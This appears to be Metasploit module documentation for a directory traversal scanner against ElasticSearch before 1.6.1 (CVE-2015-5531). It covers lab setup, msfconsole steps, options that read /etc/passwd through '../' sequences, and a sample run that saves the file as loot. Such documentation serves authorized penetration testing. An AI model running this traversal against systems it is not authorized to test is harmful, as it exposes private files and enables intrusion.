## Vulnerable Application

This module exploits a directory traversal vulnerability in ElasticSearch versions prior to
1.6.1. The flaw exists in the Snapshot API and allows an unauthenticated attacker to read
arbitrary files from the target system with the privileges of the JVM process.

The vulnerability is tracked as [CVE-2015-5531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5531).

### Setup

1. Install a vulnerable version of ElasticSearch (prior to 1.6.1). Older releases are available
   from the [ElasticSearch downloads archive](https://www.elastic.co/downloads/past-releases).
2. Configure a `path.repo` in `elasticsearch.yml` so that the Snapshot API is available:
   ```
   path.repo: ["/tmp/backups"]
   ```
3. Start ElasticSearch. It listens on port **9200** by default.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/scanner/http/elasticsearch_traversal`
3. Do: `set RHOSTS [target IP]`
4. Do: `run`
5. You should see the requested file contents saved as loot.

## Options

### FILEPATH

The path to the file to read on the target. The default value is `/etc/passwd`.

### DEPTH

The number of `../` traversal sequences to include. The default is `7`. Increase this if the
file cannot be reached with the default depth.

## Scenarios

### ElasticSearch 1.5.2 on Ubuntu 14.04

```
msf > use auxiliary/scanner/http/elasticsearch_traversal
msf auxiliary(scanner/http/elasticsearch_traversal) > set RHOSTS 10.10.10.50
RHOSTS => 10.10.10.50
msf auxiliary(scanner/http/elasticsearch_traversal) > set RPORT 9200
RPORT => 9200
msf auxiliary(scanner/http/elasticsearch_traversal) > run

[*] The target appears to be vulnerable.
[+] File saved in: /root/.msf4/loot/20250319120000_default_10.10.10.50_elasticsearch.tr_123456.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

